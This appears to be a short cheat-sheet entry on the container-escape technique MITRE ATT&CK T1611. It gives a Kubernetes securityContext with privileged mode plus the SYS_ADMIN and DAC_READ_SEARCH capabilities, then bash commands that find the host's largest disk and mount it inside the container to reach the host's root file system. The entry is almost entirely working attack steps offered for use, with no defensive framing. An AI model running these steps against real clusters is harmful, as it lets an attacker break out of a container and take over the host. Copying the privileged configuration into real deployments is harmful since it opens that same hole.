## Escape to Host Technique
https://attack.mitre.org/techniques/T1611/

### Mount Root File System

Container should have privileges to mount root file system:

``` yaml
securityContext:
    privileged: true
    capabilities:
    add:
        - SYS_ADMIN
        - DAC_READ_SEARCH
```

Example:

``` bash
$ device=$(lsblk -o NAME,SIZE -d | sort -k2 -h | tail -n 1 | awk '{print $1}') 
$ mount /dev/$device /mnt/
``` 